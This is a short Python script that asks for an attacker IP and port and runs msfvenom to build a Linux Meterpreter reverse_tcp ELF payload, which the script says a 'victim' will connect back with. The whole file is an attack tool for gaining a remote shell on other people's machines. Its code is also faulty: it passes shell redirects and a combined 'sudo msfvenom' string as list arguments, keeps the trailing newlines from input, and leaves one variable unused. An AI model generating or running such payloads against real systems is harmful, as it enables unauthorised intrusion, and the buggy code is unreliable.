import os,sys, subprocess

sys.stdout.write("SET YOUR IP ADDRESS:\n>>>")
host = sys.stdin.readline()
sys.stdout.write("SET PORT WHERE VICTIM CONNECTS:\n>>>")
port = sys.stdin.readline()
argument = "sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f elf > attack.elf"

subprocess.call(["sudo msfvenom", "-p linux/x86/meterpreter/reverse_tcp","LHOST="+host,"LPORT="+port,"-f elf > imahakkeribwoi.elf"])
